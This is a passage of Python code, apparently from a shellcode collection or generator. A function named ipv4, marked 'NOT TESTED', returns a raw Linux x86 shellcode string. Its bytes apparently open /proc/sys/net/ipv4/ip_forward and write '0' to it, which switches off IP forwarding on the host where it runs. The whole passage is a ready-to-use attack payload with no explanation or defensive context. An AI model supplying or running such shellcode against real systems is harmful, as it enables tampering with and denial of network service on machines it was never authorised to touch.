...
#NOT TESTED
def ipv4():
	shellcode =  r"\x31\xc0\x50\x68\x77\x61\x72\x64\x68"
	shellcode += r"\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70"
	shellcode += r"\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65"
	shellcode += r"\x74\x68\x73\x79\x73\x2f\x68\x72\x6f"
	shellcode += r"\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31"
	shellcode += r"\xc9\xb1\x01\xb0\x05\xcd\x80\x89\xc3"
	shellcode += r"\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2"
	shellcode += r"\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83"
	shellcode += r"\xc0\x06\xcd\x80\x31\xc0\x40\x31\xdb"
	shellcode += r"\xcd\x80"
	return shellcode
